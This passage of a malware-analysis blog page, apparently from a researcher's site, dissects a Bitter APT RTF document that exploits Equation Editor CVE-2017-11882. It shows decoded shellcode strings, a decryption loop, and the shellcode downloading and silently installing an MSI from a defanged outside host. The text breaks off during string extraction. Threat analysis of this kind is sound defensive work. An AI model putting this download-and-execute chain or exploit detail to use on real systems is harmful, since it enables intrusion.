@@ -1,0 +1,1091 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee - Malware Hell</title><meta name=Description content="An analysis of a Bitter APT maldoc exploit, ZxxZ backdoor and controling it with our own C2 server."><meta property="og:title" content="Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee"><meta property="og:description" content="An analysis of a Bitter APT maldoc exploit, ZxxZ backdoor and controling it with our own C2 server."><meta property="og:type" content="article"><meta property="og:url" content="https://c3rb3r3u5d3d53c.github.io/2022/06/bitter-apt-zxxz-backdoor/"><meta property="og:image" content="https://c3rb3r3u5d3d53c.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-06-26T00:00:00+00:00"><meta property="article:modified_time" content="2022-06-26T00:00:00+00:00"><meta property="og:site_name" content="Malware Hell"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://c3rb3r3u5d3d53c.github.io/logo.png"><meta name=twitter:title content="Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee"><meta name=twitter:description content="An analysis of a Bitter APT maldoc exploit, ZxxZ backdoor and controling it with our own C2 server."><meta name=application-name content="Malware Hell"><meta name=apple-mobile-web-app-title content="Malware Hell"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://c3rb3r3u5d3d53c.github.io/2022/06/bitter-apt-zxxz-backdoor/><link rel=prev href=https://c3rb3r3u5d3d53c.github.io/2022/06/malware-analysis-beginner-guide/><link rel=next href=https://c3rb3r3u5d3d53c.github.io/2022/07/malware-reversing-workflow/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/c3rb3r3u5d3d53c.github.io\/2022\/06\/bitter-apt-zxxz-backdoor\/"},"genre":"posts","keywords":"Rust, Reversing, Guide","wordcount":5101,"url":"https:\/\/c3rb3r3u5d3d53c.github.io\/2022\/06\/bitter-apt-zxxz-backdoor\/","datePublished":"2022-06-26T00:00:00+00:00","dateModified":"2022-06-26T00:00:00+00:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"c3rb3ru5d3d53c"},"description":"An analysis of a Bitter APT maldoc exploit, ZxxZ backdoor and controling it with our own C2 server."}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Malware Hell"><span class=header-title-pre><i class='fa-solid fa-terminal' aria-hidden=true></i></span><span id=id-2 class=typeit></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Blog </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Malware Hell"><span class=header-title-pre><i class='fa-solid fa-terminal' aria-hidden=true></i></span><span id=id-3 class=typeit></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Blog</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://c3rb3r3u5d3d53c.github.io title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>c3rb3ru5d3d53c</a></span>&nbsp;<span class=post-category>included in <a href=/categories/docs/><i class="far fa-folder fa-fw" aria-hidden=true></i>Docs</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2022-06-26>2022-06-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;5101 words&nbsp;
+<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;24 minutes&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
+<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#analysis>Analysis</a><ul><li><a href=#situational-awareness>Situational Awareness</a></li><li><a href=#infection-chain>Infection Chain</a></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#extracting-shellcode>Extracting Shellcode</a></li><li><a href=#shellcode-analysis>Shellcode Analysis</a></li></ul></li><li><a href=#post-exploitation>Post Exploitation</a><ul><li><a href=#msi-installer>MSI Installer</a></li><li><a href=#payload-triage>Payload Triage</a></li><li><a href=#initialization>Initialization</a></li><li><a href=#persistence>Persistence</a></li><li><a href=#c2-communication>C2 Communication</a><ul><li><a href=#behavior>Behavior</a></li><li><a href=#c2-responses>C2 Responses</a></li><li><a href=#c2-server-code>C2 Server Code</a></li><li><a href=#proof-of-concept-poc>Proof of Concept (PoC)</a></li><li><a href=#summary>Summary</a></li></ul></li></ul></li></ul></li><li><a href=#configuration-extraction>Configuration Extraction</a></li><li><a href=#classification>Classification</a></li><li><a href=#conclusion>Conclusion</a></li><li><a href=#downloads>Downloads</a></li><li><a href=#indicators>Indicators</a><ul><li><a href=#static>Static</a></li><li><a href=#ttps>TTPs</a></li><li><a href=#graph>Graph</a></li></ul></li><li><a href=#detection>Detection</a><ul><li><a href=#yara>YARA</a></li><li><a href=#suricata>Suricata</a></li><li><a href=#sigma>Sigma</a></li></ul></li><li><a href=#references>References</a></li></ul></nav></div></div><div class=content id=content><h2 id=introduction>Introduction</h2><p><a href=https://malpedia.caad.fkie.fraunhofer.de/actor/hazy_tiger target=_blank rel="noopener noreffer">Bitter APT</a> (T-APT-17/APT-C-08/Orange Yali) is a group known to operate in South Asia and is suspected to be an Indian 🇮‍🇳 APT. They primarialy target Pakistan 🇵‍🇰, Saudi Arabia 🇸‍🇦 and China.</p><h2 id=analysis>Analysis</h2><p>This will be an indepth analysis of Bitter APT&rsquo;s backdoor named ZxxZ. We will cover almost every aspect of the attack chain including, exploit shellcode analysis, building our own C2 server to communicate with the malware and writing detection signatures for the community.</p><h3 id=situational-awareness>Situational Awareness</h3><p><a href=https://twitter.com/ShadowChasing1 target=_blank rel="noopener noreffer">ShadowChasing1</a> posted on Twitter of about new activity from the group.</p><blockquote class=twitter-tweet><p lang=en dir=ltr>Today our researchers have found new sample which belongs to <a href="https://twitter.com/hashtag/Bitter?src=hash&ref_src=twsrc%5Etfw">#Bitter</a> <a href="https://twitter.com/hashtag/APT?src=hash&ref_src=twsrc%5Etfw">#APT</a> group<br>ITW:bf1a905e11f4d44de8bd2e0a6f383ed5<br>filename:PAC Advisory Committee Report.doc<br>URL:<br>hxxps://sbss.com.pk/gts/bd.msi<br>hxxp://subscribe.tomcruefrshsvc.com/VcvNbtgRrPopqSD/SzWvcxuer/userlog.php</p>&mdash; Shadow Chaser Group (@ShadowChasing1) <a href="https://twitter.com/ShadowChasing1/status/1478259210110775297?ref_src=twsrc%5Etfw">January 4, 2022</a></blockquote><script async src=https://platform.twitter.com/widgets.js></script><p>I decided to have a closer look just for fun. 😅</p><h3 id=infection-chain>Infection Chain</h3><p>The sample is a <a href=https://en.wikipedia.org/wiki/Rich_Text_Format target=_blank rel="noopener noreffer">RTF</a> document purporting to be a Program Advisory Comittee (PAC) report. Based on some quick googling, <a href=https://en.wikipedia.org/wiki/Pakistan target=_blank rel="noopener noreffer">Pakistan</a> 🇵‍🇰 does have a <a href=https://agp.gov.pk/SiteImage/Misc/files/8_ecosai-circular-spring-issue-2020-article-Faisal%20Saeed%20Cheema.pdf target=_blank rel="noopener noreffer">Public Accounts Comittee</a>. The PAC is responsible for regulating the use of public funds. If you are of course an adversary to Pakistan 🇵‍🇰, involving yourself in such afairs gives you better insight into the financial structure of a country. I&rsquo;m not an expert in international affairs so if this is incorrect please DM me on <a href=https://twitter.com/c3rb3ru5d3d53c target=_blank rel="noopener noreffer">Twitter</a> and I&rsquo;ll make any nessasary corrections to this analysis. The exploit shellcode will download a MSI installer, which extracts a CAB Archive containing the final Portable Executable (PE) payload.</p><div class=mermaid id=id-1></div><h3 id=exploitation>Exploitation</h3><p>The initial sample <code>PAC Advisory Committee Report.doc</code> (<code>sample_0.bin</code>), is an RTF document containing the Equation Editor exploit (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882" target=_blank rel="noopener noreffer">CVE-2017-1182</a>). Although this exploit is quite old now, it is still used by threat actors to this day.</p><h4 id=extracting-shellcode>Extracting Shellcode</h4><p>The exploit exists in object <code>4</code> in the RTF document and can be identified using <code>rtfdump</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>rtfdump.py --objects sample_0.doc
+</span></span><span class=line><span class=cl>1: Name: b<span class=s1>&#39;Equation.3\x00&#39;</span>
+</span></span><span class=line><span class=cl>   Magic: b<span class=s1>&#39;d0cf11e0&#39;</span>
+</span></span><span class=line><span class=cl>   Size: <span class=m>3584</span>
+</span></span><span class=line><span class=cl>   Hash: md5 32a758aab375df78e25fbee9d6db9ec4
+</span></span></code></pre></td></tr></table></div></div><p>Now that we have identified the suspicious OLE object, let&rsquo;s extract it.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>rtfdump.py -s <span class=m>4</span> -H -c <span class=s2>&#34;0x23:0xe23&#34;</span> -d sample_0.doc &gt; sample_1.bin
+</span></span><span class=line><span class=cl>file sample_1.bin
+</span></span><span class=line><span class=cl>sample_1.bin: Composite Document File V2 Document, Cannot <span class=nb>read</span> section info
+</span></span></code></pre></td></tr></table></div></div><p>The first order of business is to check this out with <strong>oledir</strong>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>oledir sample_1.bin
+</span></span></code></pre></td></tr></table></div></div><p>This identifies to us that the CLSID <code>0002CE02-0000-0000-C000-000000000046</code> is being used in Root Entry and is likely related to <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882" target=_blank rel="noopener noreffer">CVE-2017-1182</a>.</p><p>Now to extract object <code>4</code> from the OLE, which contains the shellcode.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>oledump.py sample_1.bin
+</span></span><span class=line><span class=cl>  1:       <span class=m>102</span> <span class=s1>&#39;\x01CompObj&#39;</span>
+</span></span><span class=line><span class=cl>  2:        <span class=m>20</span> <span class=s1>&#39;\x01Ole&#39;</span>
+</span></span><span class=line><span class=cl>  3:         <span class=m>6</span> <span class=s1>&#39;\x03ObjInfo&#39;</span>
+</span></span><span class=line><span class=cl>  4:       <span class=m>741</span> <span class=s1>&#39;Equation Native&#39;</span>
+</span></span><span class=line><span class=cl>oledump.py -s <span class=m>4</span> -d sample_1.bin &gt; sample_2.bin
+</span></span></code></pre></td></tr></table></div></div><p>Seeing attacks like this many times now, since there is no visible URL the shellcode likely is encrypted. It never hurts to attempt a XOR bruteforce to see if you are successful or not.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>xorbruteforcer.py sample_2.bin <span class=p>|</span> strings
+</span></span></code></pre></td></tr></table></div></div><p>This yields us the following strings with a <strong>0xff</strong> XOR key:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt;GetPu
+</span></span><span class=line><span class=cl>ddreu
+</span></span><span class=line><span class=cl>CreateDirectoryA
+</span></span><span class=line><span class=cl>C:<span class=se>\$</span>Jz
+</span></span><span class=line><span class=cl>LoadLibraryA
+</span></span><span class=line><span class=cl>msi.dll
+</span></span><span class=line><span class=cl>MsiSetInternalUI
+</span></span><span class=line><span class=cl>MsiInstallProductA
+</span></span><span class=line><span class=cl><span class=nv>hATSNhI</span><span class=o>=</span>NOhITCAT
+</span></span><span class=line><span class=cl>hxxp://sbss<span class=o>[</span>.<span class=o>]</span>com<span class=o>[</span>.<span class=o>]</span>pk/gts/bd<span class=o>[</span>.<span class=o>]</span>msi
+</span></span><span class=line><span class=cl>FileA
+</span></span><span class=line><span class=cl>C:<span class=se>\$</span>Gts<span class=se>\g</span>wsapip.exe
+</span></span><span class=line><span class=cl>C:<span class=se>\$</span>Gts<span class=se>\g</span>w
+</span></span><span class=line><span class=cl>LoadLibraryA
+</span></span><span class=line><span class=cl>Shell32.dll
+</span></span><span class=line><span class=cl>ShellExecuteA
+</span></span><span class=line><span class=cl>C:<span class=se>\$</span>Gts<span class=se>\g</span>wsapip.exe
+</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\e</span>xplorer
+</span></span><span class=line><span class=cl>open
+</span></span></code></pre></td></tr></table></div></div><p>This is a common mistake amongst threat actors from crimeware groups to APTs. We attack low skill encryption like this with pre-existing tools. Not to mention that <a href=https://github.com/VirusTotal/yara target=_blank rel="noopener noreffer">yara</a> also has <a href="https://yara.readthedocs.io/en/stable/writingrules.html?highlight=xor#xor-strings" target=_blank rel="noopener noreffer">XOR string</a> functionality.</p><p>Using VirusTotal the URL <font style=color:red>hxxp://sbss[.]com[.]pk/gts/bd[.]msi</font> provides us a Body SHA256 of <a href=https://www.virustotal.com/gui/file/b026a255b2e17fb0c608f1265837e425ea89cc7f661975c6a0d9051e917f4611/details target=_blank rel="noopener noreffer">b026a255b2e17fb0c608f1265837e425ea89cc7f661975c6a0d9051e917f4611</a>, which can be found <a href=https://www.virustotal.com/gui/url/d6755d5cd5ade55a4f1ea24d8872d8be6a626f97d37b090903a76d1d8147a40a/details target=_blank rel="noopener noreffer">here</a>.</p><p>Alright, we know where to find the next stage.</p><p>However, let&rsquo;s go a little deeper into analyzing the shellcode.</p><h4 id=shellcode-analysis>Shellcode Analysis</h4><p>Once the malicious RTF document is opened and the user clicks <code>Enable Editing</code>, the <code>eqnedt32.exe</code> process will be created. The buffer is overwritten and the shellcode will then be executed.</p><p>In the OLE object we find the bytes <code>b2 13 40 00</code>, which stand out as an interesting pointer to <code>0x004013b2</code> as usually the address space for <code>eqnedt32.exe</code> will be in this range. This is easily possible because the DLL Characteristics of <code>eqnedt32.exe</code> is not compiled with ASLR or <code>IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE</code> enabled. Making the exploit more reliable.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>00000900  1c 00 00 00 02 00 22 c2  cc 0e 00 00 00 00 00 00  |......&#34;.........|
+</span></span><span class=line><span class=cl>00000910  00 00 00 00 cc 6f 62 00  00 00 00 00 03 01 01 03  |.....ob.........|
+</span></span><span class=line><span class=cl>00000920  0a 0a 01 04 ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
+</span></span><span class=line><span class=cl>00000930  ff ff ff ff ff ff ff ff  ff ff d2 ce 44 00 e0 a3  |............D...|
+</span></span><span class=line><span class=cl>00000940  45 00 2a d0 00 ff 00 00  00 00 01 03 0e 00 00 01  |E.*.............|
+</span></span><span class=line><span class=cl>00000950  03 0d 00 00 01 12 83 b8  c0 44 00 e0 a3 45 00 d2  |.........D...E..|
+</span></span><span class=line><span class=cl>00000960  ce 44 00 00 40 46 00 6c  3f 44 00 b2 13 40 00 49  |.D..@F.l?D...@.I|
+</span></span></code></pre></td></tr></table></div></div><p>After setting a breakpoint in the debugger on the aforementioned address, we hit a few <code>return</code> instructions and then this decryption routine.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>00464242 | B8 18404600              | mov eax,eqnedt32.464018                 |
+</span></span><span class=line><span class=cl>00464247 | B9 2A020000              | mov ecx,22A                             |
+</span></span><span class=line><span class=cl>0046424C | F610                     | not byte ptr ds:[eax]                   |
+</span></span><span class=line><span class=cl>0046424E | 40                       | inc eax                                 |
+</span></span><span class=line><span class=cl>0046424F | E2 FB                    | loop eqnedt32.46424C                    |
+</span></span><span class=line><span class=cl>00464251 | 68 18404600              | push eqnedt32.464018                    |
+</span></span><span class=line><span class=cl>00464256 | C3                       | ret                                     |
+</span></span></code></pre></td></tr></table></div></div><p>What we thought before was an <code>XOR</code> operation is actually in this case is a <a href=https://www.felixcloutier.com/x86/not target=_blank rel="noopener noreffer">not</a> operation.</p><blockquote><p>NOT - Performs a bitwise NOT operation (each 1 is set to 0, and each 0 is set to 1) on the destination operand and stores the result in the destination operand location. The destination operand can be a register or a memory location.</p></blockquote><p>Thusly, performing <code>xor al, 0xff</code> then moving <code>al</code> to a memory location is equivelent to <code>not byte \[\&lt;ptr\>\]</code>.</p><p>It would appear the threat actors did not consider this weakness in their shellcode decryption algorithm.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/0cda966a355c28be0d906c25de27b922264e84c2efa52e309ce8e2daef351c12.jpg data-srcset="/images/0cda966a355c28be0d906c25de27b922264e84c2efa52e309ce8e2daef351c12.jpg, /images/0cda966a355c28be0d906c25de27b922264e84c2efa52e309ce8e2daef351c12.jpg 1.5x, /images/0cda966a355c28be0d906c25de27b922264e84c2efa52e309ce8e2daef351c12.jpg 2x" data-sizes=auto alt=/images/0cda966a355c28be0d906c25de27b922264e84c2efa52e309ce8e2daef351c12.jpg title=xor_not_meme width=572 height=436></p><p>The shellcode that starts being decrypted starts with a 3-byte <code>nop</code> sled and has a size of <code>0x22a</code> bytes, as indicated by moving <code>0x22a</code> into the <code>ecx</code> register when executing the <code>loop</code> instruction. Once it has finished decrypting the shellcode, the <code>return</code> instruction will set the instruction pointer to the beginning of the 3-byte nop sled.</p><p>After using the <a href=https://en.wikipedia.org/wiki/Win32_Thread_Information_Block target=_blank rel="noopener noreffer">TIB</a> to obtain the linear address of the <a href=https://en.wikipedia.org/wiki/Process_Environment_Block target=_blank rel="noopener noreffer">PEB</a> and getting the address of <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress target=_blank rel="noopener noreffer">kernel32.GetProcAddress</a></em>. It will get the address of <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createdirectorya target=_blank rel="noopener noreffer">kernel32.CreateDirectoryA</a></em> to create the directory <code>C:\\$Jz</code>.</p><p>Once the directory has been created, it will get the addresses of <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya target=_blank rel="noopener noreffer">kernel32.LoadLibrary</a></em> and use it to load <code>msi.dll</code> into the <code>eqnedt32.exe</code> process. It will then call <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/msi/nf-msi-msisetinternalui target=_blank rel="noopener noreffer">msi.MsiSetInternalUI</a></em>. This will setup the installer&rsquo;s internal user interface. This is required for other subsequent calls to other installer functions.</p><p>After the function interface has been setup, it will call <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/msi/nf-msi-msiinstallproducta target=_blank rel="noopener noreffer">msi.MsiInstallProductA</a></em> with the following parameters.</p><table><thead><tr><th>Parameter</th><th>Value</th></tr></thead><tbody><tr><td>szPackagePath</td><td><font style=color:red>hxxp://sbss[.]com[.]pk/gts/bd[.]msi</font></td></tr><tr><td>szCommandLine</td><td>ITCAI=NOATSNLL</td></tr></tbody></table><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/8a97eaae60c7df18708323a91a1e8137088eb958336f83c25d41989064d0787e.png data-srcset="/images/8a97eaae60c7df18708323a91a1e8137088eb958336f83c25d41989064d0787e.png, /images/8a97eaae60c7df18708323a91a1e8137088eb958336f83c25d41989064d0787e.png 1.5x, /images/8a97eaae60c7df18708323a91a1e8137088eb958336f83c25d41989064d0787e.png 2x" data-sizes=auto alt=/images/8a97eaae60c7df18708323a91a1e8137088eb958336f83c25d41989064d0787e.png title=MsiInstallProductA width=1181 height=568>
+<em>Figure 1: Equation Editor Shellcode Executing <a href=https://docs.microsoft.com/en-us/windows/win32/api/msi/nf-msi-msiinstallproducta target=_blank rel="noopener noreffer">msi.MsiInstallProductA</a></em></p><p>This will result in the following traffic.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/gts/bd.msi</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>Keep-Alive</span>
+</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>*/*</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Windows Installer</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>sbss.com.pk</span>
+</span></span></code></pre></td></tr></table></div></div><p>This will execute the MSI installer silently on using the <code>eqnedt32.exe</code> process.</p><p>The site <font style=color:red>sbss[.]com[.]pk</font> appears to be a service that allows you to buy and sell property. It was created on Feb 15th, 2021 according to <a href=https://pk6.pknic.net.pk/pk5/lookup.PK target=_blank rel="noopener noreffer">PKNIC</a>. Interestingly, the site is using Wordpress 5.8.3 at the time of this analysis. The previous version 5.8.2 had a major SQL Injection vulnerability <a href=https://github.com/TAPESH-TEAM/CVE-2022-21661-WordPress-Core-5.8.2-WP_Query-SQL-Injection target=_blank rel="noopener noreffer">CVE-2022-21661</a>. It is not easily posible to determine what exactly happened to the website without access. It was either compromised or it was created by the threat actors themselves. This analysis will not go into the geopolitical aspects of tracing actors. We will save this for for another blog post.</p><p>Once completed, it will call <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess target=_blank rel="noopener noreffer">kernel32.ExitProcess</a></em> as to not arouse any suspicion from the user.</p><p>Although, it may arouse some suspicion as the document is empty and does not contain any decoy text. 🤔</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/97bbd1600995442c8a0ad41a46477044a8e31af1c254e959c3285bf958ecbd92.png data-srcset="/images/97bbd1600995442c8a0ad41a46477044a8e31af1c254e959c3285bf958ecbd92.png, /images/97bbd1600995442c8a0ad41a46477044a8e31af1c254e959c3285bf958ecbd92.png 1.5x, /images/97bbd1600995442c8a0ad41a46477044a8e31af1c254e959c3285bf958ecbd92.png 2x" data-sizes=auto alt=/images/97bbd1600995442c8a0ad41a46477044a8e31af1c254e959c3285bf958ecbd92.png title="Failed Decoy" width=785 height=612>
+<em>Figure 2: User Perspective of Suspicious Empty Document</em></p><h3 id=post-exploitation>Post Exploitation</h3><p>This section in the analysis will cover the post exploitation behavior of Bitter APT&rsquo;s ZxxZ backdoor.</p><h4 id=msi-installer>MSI Installer</h4><p>The MSI installer contains the file <code>sample_5.bin</code>, which is a <a href=https://en.wikipedia.org/wiki/Cabinet_%28file_format%29 target=_blank rel="noopener noreffer">Cabinet</a> (or CAB) archive file for Windows. Once extracted, we get <code>sample_6.bin</code>, which is a Windows Portable Executable (PE). This can all be extracted using <a href=https://www.7-zip.org/ target=_blank rel="noopener noreffer">7zip</a> and make it easy enough for us to gain access to the payload.</p><h4 id=payload-triage>Payload Triage</h4><p>We have finally arrived at the payload <code>sample_6.bin</code>.</p><p>I used <a href=https://github.com/mandiant/flare-floss target=_blank rel="noopener noreffer">floss</a> on the executable and got the following interesting strings.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>floss sample_6.bin
+</span></span><span class=line><span class=cl>subscribe<span class=o>[</span>.<span class=o>]</span>tomcruefrshsvc<span class=o>[</span>.<span class=o>]</span>com
+</span></span><span class=line><span class=cl>update.exe
+</span></span><span class=line><span class=cl>Updates
+</span></span><span class=line><span class=cl>uer/sDeRcEwwQaAsSN.php?txt<span class=o>=</span>
